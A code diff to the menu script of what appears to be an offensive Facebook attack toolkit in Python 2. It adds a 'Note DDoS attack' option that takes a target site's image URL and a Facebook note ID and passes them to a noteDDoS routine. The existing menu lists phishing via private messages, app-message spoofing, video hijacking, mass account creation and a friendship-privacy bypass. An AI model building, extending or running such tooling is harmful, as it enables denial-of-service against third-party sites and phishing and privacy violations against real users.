@@ -1,4 +1,4 @@
-from mainFunc import privateMessageLink,sendRequestToList,setGlobalLogginng ,reAnalyzeGraph,analyzeGraph,bypassFriendshipPrivacyPlot,massLogin,acceptRequest,friendshipRequest,like,appMessageSpoof,setMail,login,linkPreviewYoutube,linkPreview,hijackVideo, privateMessagePhishing, bypassFriendshipPrivacy, linkFriends, createUser, deleteUser,deleteAccounts, checkPrivacy, friendshipPlot, simpleGraph, dotFile, simpleDotGraph
+from mainFunc import privateMessageLink,sendRequestToList,setGlobalLogginng ,reAnalyzeGraph,analyzeGraph,bypassFriendshipPrivacyPlot,massLogin,acceptRequest,friendshipRequest,like,appMessageSpoof,setMail,login,linkPreviewYoutube,linkPreview,hijackVideo, privateMessagePhishing, bypassFriendshipPrivacy, linkFriends, createUser, deleteUser,deleteAccounts, checkPrivacy, friendshipPlot, simpleGraph, dotFile, simpleDotGraph, noteDDoS
 from database import connect,status
 from time import time
 import signal
@@ -57,7 +57,7 @@ def main():
                (int(option) != 17) and (int(option) != 18) and
                (int(option) != 19) and (int(option) != 20) and
                (int(option) != 21) and (int(option) != 22) and 
-               (int(option) != 23)):
+               (int(option) != 23) and (int(option) != 24)):
                         
             print '\n'
             print '1)  Create accounts\n'
@@ -82,7 +82,8 @@ def main():
             print '20) Print dead attacks :\'( \n'
             print '21) Send friend request to disclosed friend list from your account\n'
             print '22) Bypass friendship (only .dot without graph integration)\n'
-            print '23) Close the application\n'
+            print '23) Note DDoS attack\n'
+            print '24) Close the application\n'
             
             choice = raw_input('Insert your choice: ')
             
@@ -421,8 +422,26 @@ def main():
                     friendList, friendsName = friendshipPlot(check,victim)
                     simpleDotGraph(friendsName, victim)
 
-                    
         if (int(option) == 23):
+            signal.signal(signal.SIGINT, signal_handler)
+            print 'Facebook note DDoS attack, discovered by chr13: http://chr13.com/about-me/'
+            if (globalLogin == False):
+                email,password = setMail()
+            else:
+                email = globalEmail
+                password = globalPassword
+
+            if (login(email,password,'real'))!= -1:
+                raw_input('Usage: First you must create an empty note. Once your note is created, write down the note ID number from the URL. ENTER TO CONTINUE...')
+                imageURL = raw_input('Insert the image URL from the site attack: ')
+                noteID = raw_input('Insert the note ID: ')
+                option = raw_input("Insert option for privacy 0:Public 1:Friends 2:Only Me : ")
+                if option in privacySet:
+                    noteDDoS(imageURL,noteID, privacy[option])
+        
+
+                    
+        if (int(option) == 24):
             connect.close()
             
             print '\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n '                        
